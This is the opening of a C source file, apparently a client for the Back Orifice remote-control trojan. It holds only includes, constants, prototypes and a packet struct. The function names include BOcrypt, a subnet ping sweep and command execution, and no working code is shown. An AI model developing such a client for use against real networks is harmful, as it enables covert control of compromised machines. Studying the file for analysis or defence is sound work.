#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h> 
#include <arpa/inet.h>
#include <errno.h>
#include <stdlib.h>
#include <stdio.h>
#ifdef HAVE_UNISTD_H
#include <unistd.h>
#endif
#ifdef HAVE_SYS_TIME_H
#include <sys/time.h>
#endif
#ifdef HAVE_SYS_SELECT_H
#include<sys/select.h>
#endif
#ifdef HAVE_STRINGS_H
#include<strings.h>
#endif
#ifdef HAVE_MALLOC_H
#include <malloc.h>
#endif
#include <netdb.h>
#include <string.h>
#include <ctype.h>
#include "wcommon.h"

#define COMMANDSIZE 512
#define ARGSIZE 256
#define SWEEPDELAY 4

/* FUNCTIONS */
void msrand (unsigned int seed );
int mrand (void);
unsigned int getkey();
void BOcrypt(unsigned char *buff, int len);

int pingsweepsubnet(char *arg1, int udpsock, int port);
int sendping(unsigned long dest, int port, int sock);
int sendpacket(unsigned char type, const char *str1, const char *str2, 
	       unsigned long dest, int port, int sock);

int getpong(int sock);
int getinput(int sock);

void fixfilename(char *buff, const char *cwd, const char *path);
int executecommand(char *command, char *arg1, char *arg2);

void printhelp(void);
void givehelpcommand(char *arg1);

/* STRUCTURES */

struct packlink {
  int size;
  unsigned long id;
  void *data;
  unsigned long host;
  struct packlink *prev;
  struct packlink *next;
};

